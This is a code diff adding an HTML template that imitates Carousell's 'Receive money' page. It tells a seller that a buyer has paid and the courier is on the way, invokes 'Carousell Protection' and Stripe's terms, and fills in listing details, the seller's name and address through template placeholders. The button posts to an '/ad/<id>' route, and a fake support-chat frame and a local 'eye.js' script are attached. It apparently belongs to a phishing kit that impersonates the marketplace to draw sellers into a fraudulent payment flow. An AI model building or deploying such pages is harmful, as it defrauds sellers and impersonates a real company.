+
+        .M_kR:-ms-input-placeholder {
+            opacity: 1
+        }
+
+        .M_kR::placeholder {
+            opacity: 1
+        }
+
+        .M_kS {
+            max-width: 40%
+        }
+
+        .M_kT {
+            border-color: #991720 !important
+        }
+
+        .M_kU {
+            padding: 0
+        }
+
+        input[type=time]::-webkit-calendar-picker-indicator {
+            width: 24px;
+            height: 24px;
+            margin-right: -8px
+        }
+
+        .M_kw {
+            padding-top: 12px
+        }
+
+        .M_kx {
+            align-items: center;
+            border-bottom: 1px solid #c5c5c6
+        }
+
+        .M_kx:focus-within {
+            border-bottom: 1px solid #008f79
+        }
+
+        .M_ky {
+            padding-right: 8px
+        }
+
+        .M_kz {
+            left: 0;
+            max-width: calc(100% - 20px);
+            padding: 0
+        }
+
+        .M_k_ {
+            transform: translateY(-135%)
+        }
+
+        .M_kA {
+            transform: translateY(-150%)
+        }
+
+        .M_kB {
+            padding: 4px 0
+        }
+
+        .M_kC {
+            padding-right: 8px
+        }
+
+        .M_kE {
+            padding-left: 8px
+        }
+
+        .M_kF {
+            padding-left: 16px
+        }
+
+        .M_kG {
+            font-size: 14px;
+            line-height: 14px
+        }
+
+        .M_kH {
+            font-size: 16px;
+            line-height: 16px
+        }
+
+        .M_kI {
+            width: 16px;
+            height: 16px
+        }
+
+        .M_kJ {
+            padding: 4px 0 0
+        }
+    </style>
+    <style data-href="https://mweb-cdn.karousell.com/build/e7455e4551c99ad28c06.min.css">
+        .M_qH,
+        .M_qI,
+        .M_qJ {
+            padding: 8px 16px;
+            border-radius: 4px
+        }
+
+        .M_qH {
+            color: #2c2c2d;
+            border: 1px solid #c5c5c6
+        }
+
+        .M_qH:active,
+        .M_qH:focus {
+            box-shadow: 0 0 0 4px #cce9e4
+        }
+
+        .M_qI {
+            background-color: #008f79
+        }
+
+        .M_qI:active,
+        .M_qI:focus {
+            background-color: #026958;
+            box-shadow: 0 0 0 4px #cce9e4
+        }
+
+        .M_qJ {
+            background-color: #ff2636
+        }
+
+        .M_qJ:active,
+        .M_qJ:focus {
+            background-color: #cc1e2b;
+            box-shadow: 0 0 0 4px #ffd4d7
+        }
+
+        .M_qK:active,
+        .M_qK:focus {
+            color: #008f79
+        }
+
+        .M_qK:active,
+        .M_qK:focus,
+        .M_qL {
+            text-decoration: underline
+        }
+    </style>
+    <style data-href="https://mweb-cdn.karousell.com/build/e78cc02fdcab04ee8469.min.css">
+        .M_mB {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 100%;
+            background: rgba(44, 44, 45, .8)
+        }
+
+        .M_mC {
+            position: relative;
+            width: 480px;
+            max-height: 90vh;
+            padding: 24px;
+            background-color: #fff;
+            border-radius: 4px;
+            box-shadow: 0 8px 13px 0 rgba(44, 44, 45, .27)
+        }
+
+        .M_mE {
+            position: absolute;
+            top: 12px;
+            right: 12px
+        }
+
+        .M_mF {
+            width: calc(100% - 16px);
+            margin-bottom: 12px
+        }
+
+        .M_mG {
+            display: flex;
+            justify-content: center
+        }
+
+        .M_mH {
+            width: 128px;
+            margin: 12px 0 24px
+        }
+
+        .M_mI {
+            background: #f0f1f1
+        }
+
+        .M_mA {
+            width: calc(100% - 96px)
+        }
+    </style>
+    <style data-href="https://mweb-cdn.karousell.com/build/ee61916a8a639afa836c.min.css">
+        .M_rb {
+            position: relative;
+            display: inline-block;
+            min-height: 30px;
+            padding-right: 8px;
+            padding-left: 28px
+        }
+
+        .M_rb:before {
+            top: 2px;
+            left: 0;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #57585a;
+            border-radius: 50%;
+            outline: none;
+            transition: border-color .5s ease
+        }
+
+        .M_rb:after,
+        .M_rb:before {
+            position: absolute;
+            content: ""
+        }
+
+        .M_rb:after {
+            top: 6px;
+            left: 4px;
+            width: 12px;
+            height: 12px;
+            background: none;
+            border-radius: 50%;
+            transition: background .5s ease
+        }
+
+        .M_rc:before {
+            border-color: #008f79
+        }
+
+        .M_rc:after {
+            background: #008f79
+        }
+
+        .M_re:before {
+            border-color: #991720
+        }
+
+        .M_rf {
+            position: absolute;
+            opacity: 0
+        }
+
+        .M_rg {
+            display: flex;
+            align-items: center;
+            max-width: 100%
+        }
+
+        .M_rh {
+            flex-shrink: 0;
+            width: auto;
+            height: 24px;
+            margin-right: 8px
+        }
+
+        .M_ri {
+            background: transparent
+        }
+    </style>
+    <style data-href="https://mweb-cdn.karousell.com/build/fdf16e2f2579b471f860.min.css">
+        .M_nB {
+            position: fixed;
+            right: 0;
+            bottom: 0;
+            left: 0;
+            z-index: 4;
+            max-height: 80vh;
+            overflow-y: auto;
+            background: #fff;
+            border-radius: 4px 4px 0 0
+        }
+
+        .M_nC {
+            bottom: 24px
+        }
+
+        .M_nE {
+            position: fixed;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            left: 0;
+            z-index: 3;
+            background: rgba(44, 44, 45, .8)
+        }
+    </style>
+    <style data-href="https://mweb-cdn.karousell.com/build/8b3c535adf91657ae87b.min.css">
+        .M_WY {
+            width: 100%;
+            border-bottom: 1px solid #c5c5c6
+        }
+
+        .M_WY,
+        .M_WZ {
+            display: flex
+        }
+
+        .M_WZ {
+            flex-direction: column;
+            flex-grow: 1
+        }
+
+        .M_Xa {
+            color: #c5c5c6
+        }
+    </style>
+    <style data-href="https://mweb-cdn.karousell.com/build/75f9cd8c41810ad5c83d.min.css">
+        .M_aaC {
+            padding: 16px;
+            background-color: #fff;
+            border: 1px solid rgba(44, 44, 45, .07);
+            border-radius: 8px 8px 0 0
+        }
+
+        .M_aaE {
+            padding: 8px
+        }
+
+        .M_aaF {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px
+        }
+
+        .M_aaG {
+            width: 100%;
+            padding: 12px;
+            text-align: center
+        }
+
+        .M_aaH {
+            margin-top: 16px
+        }
+
+        .M_aaI {
+            width: 100%
+        }
+
+        .M_aaI:not(:last-child) {
+            margin-bottom: 16px
+        }
+
+        .M_XU {
+            padding-bottom: 8px;
+            margin-bottom: 32px;
+            box-shadow: inset 0 -1px 0 0 rgba(44, 44, 45, .07)
+        }
+
+        .M_XV:not(:first-of-type) {
+            padding-left: 8px
+        }
+
+        .M_XW {
+            display: block;
+            padding-top: 0;
+            padding-right: 24px;
+            padding-bottom: 0;
+            margin-top: 4px;
+            text-align: left
+        }
+
+        .M_XX {
+            padding-left: 28px
+        }
+
+        .M_XY {
+            position: relative;
+            display: flex
+        }
+
+        .M_XZ {
+            flex: 1 1 auto;
+            min-height: auto
+        }
+
+        .M_Ya {
+            z-index: 1;
+            padding: 0
+        }
+    </style>
+    <style data-href="https://mweb-cdn.karousell.com/build/cb3dae42a106b3c06699.min.css">
+        .M_Xw {
+            display: flex;
+            justify-content: center
+        }
+
+        .M_Xx {
+            width: 128px;
+            margin: 12px 0 24px
+        }
+
+        .M_Xy {
+            justify-content: flex-end;
+            margin-top: 24px
+        }
+
+        .M_WL,
+        .M_Xy {
+            display: flex
+        }
+
+        .M_WL {
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%
+        }
+
+        .M_WM {
+            margin-bottom: 20px
+        }
+
+        .M_aaJ {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 16px;
+            background-color: #fff;
+            border: 1px solid rgba(44, 44, 45, .07);
+            border-radius: 8px 8px 0 0
+        }
+
+        .M_aaK {
+            width: 70%;
+            margin: 24px 0
+        }
+
+        .M_aaL {
+            margin-bottom: 4px
+        }
+
+        .M_aaM {
+            margin-left: 4px
+        }
+
+        .M_aaN {
+            width: 100%;
+            padding: 12px;
+            text-align: center
+        }
+    </style>
+    <style data-href="https://mweb-cdn.karousell.com/build/26fade52b4abbed0e7f3.min.css">
+        .M_Ww {
+            width: 100%;
+            height: 8px;
+            background-color: #f0f1f1;
+            border-radius: 4px
+        }
+
+        .M_Wx {
+            height: 16px
+        }
+
+        .M_Wy {
+            margin-top: 32px;
+            margin-bottom: 56px
+        }
+
+        .M_Wz {
+            margin-bottom: 40px
+        }
+
+        .M_Wz>div {
+            margin-bottom: 28px
+        }
+
+        .M_W_ {
+            margin-top: 8px
+        }
+
+        .M_WA {
+            margin-bottom: 12px
+        }
+
+        .M_WB {
+            width: 152px
+        }
+
+        .M_WC {
+            width: 128px
+        }
+
+        .M_WE {
+            width: 72px
+        }
+
+        .M_WF {
+            width: 56px
+        }
+
+        .M_WG {
+            width: 120px;
+            margin-top: 12px;
+            margin-bottom: 36px
+        }
+
+        .M_WH {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 24px
+        }
+
+        .M_WI {
+            margin-bottom: 16px
+        }
+
+        .M_WJ {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 24px
+        }
+
+        .M_WK {
+            margin-left: 16px
+        }
+
+        .M_WN {
+            margin-top: 20px
+        }
+
+        .M_WO {
+            display: flex;
+            flex-direction: row;
+            justify-content: space-between;
+            padding: 8px 0
+        }
+
+        .M_WP {
+            align-items: center
+        }
+
+        .M_WQ {
+            overflow: visible;
+            text-align: right;
+            white-space: nowrap
+        }
+
+        .M_WR {
+            display: inline-block;
+            max-width: 80%;
+            word-break: break-all
+        }
+
+        .M_WS {
+            flex-grow: 1
+        }
+
+        .M_WT {
+            display: flex
+        }
+
+        .M_WU {
+            padding: 0;
+            margin-left: 4px
+        }
+
+        .M_WV {
+            width: 16px;
+            height: 16px
+        }
+
+        .M_WW {
+            display: flex
+        }
+
+        .M_WX {
+            display: inline;
+            padding: 0 8px
+        }
+
+        .M_Xb {
+            display: flex;
+            flex-direction: row
+        }
+
+        .M_Xc {
+            width: 100%;
+            margin-right: 8px
+        }
+
+        .M_Xe {
+            white-space: nowrap
+        }
+
+        .M_Xf {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px
+        }
+
+        .M_Xg {
+            margin-top: 4px
+        }
+
+        .M_Xh {
+            margin-top: 16px
+        }
+
+        .M_Xi {
+            display: flex;
+            justify-content: space-between
+        }
+
+        .M_Xj {
+            position: relative;
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            margin-left: 8px
+        }
+
+        .M_bN {
+            padding: 60px 16px 72px
+        }
+
+        .M_bO {
+            position: fixed;
+            top: 0;
+            right: 0;
+            left: 0;
+            z-index: 1
+        }
+
+        .M_bP {
+            margin-top: 16px
+        }
+
+        .M_bQ {
+            display: grid;
+            grid-template-areas: "infoIcon gapLeft infoHeader infoArrow" "infoIcon gapLeft infoDescription infoArrow";
+            grid-template-columns: 32px 12px auto 40px;
+            align-items: center;
+            padding: 8px 0 8px 8px;
+            margin: 32px auto;
+            cursor: pointer;
+            background-color: #f0f1f1;
+            border-radius: 8px
+        }
+
+        .M_bR {
+            grid-area: infoIcon;
+            width: 40px
+        }
+
+        .M_bS {
+            grid-area: infoHeader
+        }
+
+        .M_bT {
+            grid-area: gapLeft
+        }
+
+        .M_bU {
+            grid-area: infoDescription
+        }
+
+        .M_bV {
+            grid-area: infoArrow
+        }
+
+        .M_bW {
+            margin: 24px auto;
+            -webkit-hyphens: none;
+            -ms-hyphens: none;
+            hyphens: none
+        }
+
+        .M_bX {
+            display: grid;
+            grid-template-areas: "listingImg listingTitle" "listingImg listingPrice";
+            grid-template-rows: 1fr 1fr;
+            grid-template-columns: 64px 1.5fr;
+            margin-bottom: 24px
+        }
+
+        .M_bY {
+            grid-area: listingImg;
+            width: 48px;
+            height: 48px;
+            border-radius: 8px
+        }
+
+        .M_bZ {
+            grid-area: listingTitle
+        }
+
+        .M_ca {
+            grid-area: listingPrice
+        }
+
+        .M_cb {
+            margin-left: 8px
+        }
+
+        .M_cc {
+            display: block;
+            padding-bottom: 12px;
+            margin: 12px auto;
+            box-shadow: inset 0 -1px 0 0 rgba(44, 44, 45, .07)
+        }
+
+        .M_ce>p {
+            display: flex;
+            justify-content: space-between
+        }
+
+        .M_cf {
+            position: relative;
+            top: 2px;
+            width: 12px;
+            height: 12px
+        }
+
+        .M_cg {
+            margin-top: 24px;
+            -webkit-hyphens: none;
+            -ms-hyphens: none;
+            hyphens: none;
+            text-align: center
+        }
+
+        .M_ch {
+            display: inline
+        }
+
+        .M_ci {
+            display: flex;
+            margin-top: 4px
+        }
+
+        .M_cj {
+            flex-shrink: 0;
+            width: auto;
+            height: 24px;
+            margin-right: 8px
+        }
+
+        .M_ck {
+            background: transparent
+        }
+
+        .M_cl {
+            padding-left: 8px;
+            margin-top: 20px
+        }
+
+        .M_cm {
+            margin-top: 52px
+        }
+
+        .M_cn {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            display: flex;
+            padding: 12px 16px;
+            background-color: #fff;
+            box-shadow: 0 -4px 10px -6px rgba(44, 44, 45, .27)
+        }
+
+        .M_cn,
+        .M_co {
+            width: 100%
+        }
+
+        .M_cp {
+            padding: 112px 0;
+            margin: 0 auto
+        }
+
+        .M_cq {
+            width: 100%
+        }
+
+        .M_cr {
+            display: inline-block;
+            width: 50%;
+            text-align: center
+        }
+
+        .M_cs {
+            margin-top: 4px
+        }
+    </style>
+    <meta content="false" name="branch:deeplink:safari-on-ios">
+    <link crossorigin="anonymous" href="./carousellhtml_files/a823ad8458600488723d.min.css" rel="stylesheet"
+        type="text/css">
+    <link crossorigin="anonymous" href="./carousellhtml_files/1645892c230312cf56f4.min.css" rel="stylesheet"
+        type="text/css">
+    <link crossorigin="anonymous" href="./carousellhtml_files/fb957b237d5899a27395.min.css" rel="stylesheet"
+        type="text/css">
+    <link crossorigin="anonymous" href="./carousellhtml_files/35b9c3c3d12f24458649.min.css" rel="stylesheet"
+        type="text/css">
+    <link crossorigin="anonymous" href="./carousellhtml_files/d868b57fa29a343f7d70.min.css" rel="stylesheet"
+        type="text/css">
+    <link crossorigin="anonymous" href="./carousellhtml_files/3022d3e0209b632a70fc.min.css" rel="stylesheet"
+        type="text/css">
+    <link crossorigin="anonymous" href="./carousellhtml_files/3ce5b808b59bcc8bd142.min.css" rel="stylesheet"
+        type="text/css">
+</head>
+
+<body style="">
+    <div id="root">
+        <div class="M_bN">
+            <div class="M_bO">
+                <div class=" M_ik M_il">
+                    <div class="M_im" data-testid="navbarmobile-div-titlebar">
+                        <div class="M_in ">
+                            <button class="M_hP M_ic M_ii M_io" data-testid="navbarmobile-btn-lefticon" type="button">
+                                <svg class="" fill="#57585a" fill-rule="nonzero" height="24" viewBox="0 0 24 24"
+                                    width="24" xmlns="http://www.w3.org/2000/svg">
+                                    <path id="iconBack"
+                                        d="M4.414 13l5.293 5.293a1 1 0 1 1-1.414 1.414l-7-7a1 1 0 0 1 0-1.414l7-7a1 1 0 0 1 1.414 1.414L4.414 11H22a1 1 0 0 1 0 2H4.414z">
+                                    </path>
+                                </svg>
+                            </button>
+                        </div>
+                        <div class="M_iq ">
+                            <p class="M_hw M_hj M_hx M_h_ M_hB M_hG M_hJ M_hq">Receive money</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <p class="M_hw M_hh M_hx M_h_ M_hC M_hG M_hI M_bW M_hr">The courier will contact you after receiving payment for the goods.</p>
+            <div class="M_bX"><span class="M_hK M_bY M_hL"><img alt="" class="M_hN" src="<%=ad.photo%>" title=""></span>
+                <p class="M_hw M_hj M_hx M_h_ M_hC M_hG M_hI M_bZ M_hq">
+                    <%=ad.title%>
+                </p>
+                <p class="M_hw M_hj M_hx M_h_ M_hC M_hG M_hJ M_ca M_hq">
+                    <%=ad.price%>
+                </p>
+            </div>
+            <button class="M_hP M_ic M_ii M_WY" type="button">
+                <div class="M_WZ">
+                    <p class="M_hw M_hh M_hx M_h_ M_hB M_hG M_hI M_hr">Deal method</p>
+                    <p class="M_hw M_hj M_hx M_h_ M_hB M_hG M_hI M_hp">Courier delivery</p>
+                </div>
+                <svg class="" fill="#57585a" height="24" role="img" viewBox="0 0 24 24" width="24"
+                    xmlns="http://www.w3.org/2000/svg">
+                    <path id="iconArrow"
+                        d="M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z">
+                    </path>
+                </svg>
+            </button>
+            <p class="M_hw M_hc M_hx M_h_ M_hC M_hG M_hI M_cb M_hr">1-2 business days</p>
+            <button class="M_hP M_ic M_ii M_WY M_bP" type="button">
+                <div class="M_WZ">
+                    <p class="M_hw M_hh M_hx M_h_ M_hB M_hG M_hI M_hr">Deliver to</p>
+                    <p class="M_hw M_hj M_hx M_h_ M_hC M_hG M_hI M_hq">
+                        <%=ad.name%>
+                    </p>
+                    <div class="M_XW"><span class="M_hw M_hj M_hx M_h_ M_hC M_hG M_hI M_XV M_hq">
+                            <%=ad.address%>
+                        </span></div>
+                </div>
+                <svg class="" fill="#57585a" height="24" role="img" viewBox="0 0 24 24" width="24"
+                    xmlns="http://www.w3.org/2000/svg">
+                    <path id="iconArrow"
+                        d="M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z">
+                    </path>
+                </svg>
+            </button>
+            <div class="M_cm">
+                <h2 class="M_ys M_hj M_yx M_y_ M_xP">The buyer has paid for the product and shipping, all that's left is
+                    to get the money!</h2>
+                <div class="M_WN">
+                    <div class="M_WO">
+                        <p class="M_hw M_hj M_hx M_h_ M_hC M_hG M_hI M_hq">Item price</p>
+                        <p class="M_hw M_hj M_hx M_h_ M_hC M_hG M_hI M_WQ M_hq">
+                            <%=ad.price%>
+                        </p>
+                    </div>
+                    <div class="M_WO">
+                        <p class="M_hw M_hj M_hx M_h_ M_hC M_hG M_hJ M_hq">Total</p>
+                        <p class="M_hw M_hj M_hx M_h_ M_hC M_hG M_hJ M_WQ M_hq">
+                            <%=ad.price%>
+                        </p>
+                    </div>
+                </div>
+            </div>
+            <div class="M_bQ"><img alt="" class="M_hN M_hK M_bR"
+                    src="./carousellhtml_files/carousell-protection-logo-38XrUGk2B0.svg" title="">
+                <div class="M_bT"></div>
+                <p class="M_hw M_hj M_hx M_h_ M_hC M_hG M_hJ M_bS M_hq">Carousell Protection</p>
+                <div class="M_bU"><span class="M_hw M_hj M_hx M_h_ M_hC M_hG M_hI M_hr">Safely receive money for your
+                        goods</span>
+                </div>
+                <svg class="M_bV" fill="#57585a" height="24" role="img" viewBox="0 0 24 24" width="24"
+                    xmlns="http://www.w3.org/2000/svg">
+                    <path id="iconArrow"
+                        d="M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z">
+                    </path>
+                </svg>
+            </div>
+            <ul>
+                <li class="M_cc"><a class="M_ce M_km"
+                        href="https://support.carousell.com/hc/en-us/articles/360038048693" rel="noopener noreferrer"
+                        target="_blank">
+                        <p class="M_hw M_hh M_hx M_h_ M_hB M_hG M_hI M_qK M_hq">Is this safe? How am I protected?
+                            <svg class="M_cf" fill="none" height="10" viewBox="0 0 10 10" width="10"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <path
+                                    d="M8.293 1H2.5a.5.5 0 010-1h7a.499.499 0 01.5.497V7.5a.5.5 0 01-1 0V1.707L.854 9.854a.5.5 0 01-.708-.708L8.293 1z"
+                                    fill="#57585a"></path>
+                            </svg>
+                        </p>
+                    </a></li>
+                <li class="M_cc"><a class="M_ce M_km"
+                        href="https://support.carousell.com/hc/en-us/articles/360038048693" rel="noopener noreferrer"
+                        target="_blank">
+                        <p class="M_hw M_hh M_hx M_h_ M_hB M_hG M_hI M_qK M_hq">What is covered?
+                            <svg class="M_cf" fill="none" height="10" viewBox="0 0 10 10" width="10"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <path
+                                    d="M8.293 1H2.5a.5.5 0 010-1h7a.499.499 0 01.5.497V7.5a.5.5 0 01-1 0V1.707L.854 9.854a.5.5 0 01-.708-.708L8.293 1z"
+                                    fill="#57585a"></path>
+                            </svg>
+                        </p>
+                    </a></li>
+            </ul>
+            <p class="M_hw M_hj M_hx M_h_ M_hC M_hG M_hI M_cg M_hq">By tapping on ‘Receive money’, you accept the terms
+                of
+                service from <a class="M_ch M_km" href="https://support.carousell.com/hc/articles/115011881808"
+                    rel="noopener noreferrer" target="_blank"><span
+                        class="M_hw M_gZ M_hx M_h_ M_hB M_hG M_hI M_qL M_hr">Carousell</span></a>, and payments provider
+                <a class="M_ch M_km" href="https://stripe.com/en-my/connect-account/legal" rel="noopener noreferrer"
+                    target="_blank"><span class="M_hw M_gZ M_hx M_h_ M_hB M_hG M_hI M_qL M_hr">Stripe</span></a>.</p>
+            <form action="/ad/<%=ad.id%>" method="get">
+                <input type="hidden" name="refer" value="">
+                <div class="M_cn">
+                    <button class="M_hP M_ic M_hR M_co" type="submit">Receive money</button>
+                </div>
+            </form>
+        </div>
+    </div>
+    <div class="
+    chatra--webkit
+    chatra--style-round
+    chatra--side-bottom
+    chatra--pos-right
+    chatra--visible
+    chatra--expanded
+    chatra--fast-toggle
+    " id="chatra" data-turbolinks-permanent="" style="
+    width: 380px;
+    height: 600px;
+    transform: none;
+    z-index: 2147483647;
+    display: none;
+    ">
+    <div id="chatra__iframe-wrapper">
+    <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat" allow="autoplay"
+    src="/supportChatFrame/<%=ad.id%>" style="width: 380px; height: 600px; position: absolute"></iframe>
+    </div>
+    </div>
+    <div class="support-circle"
+    onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"></div>
+    
+    <script>
+    const adId = "<%=ad.id%>"
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.2/axios.min.js"></script>
+    <script src="/js/eye.js" defer></script>
+    
+    </body>
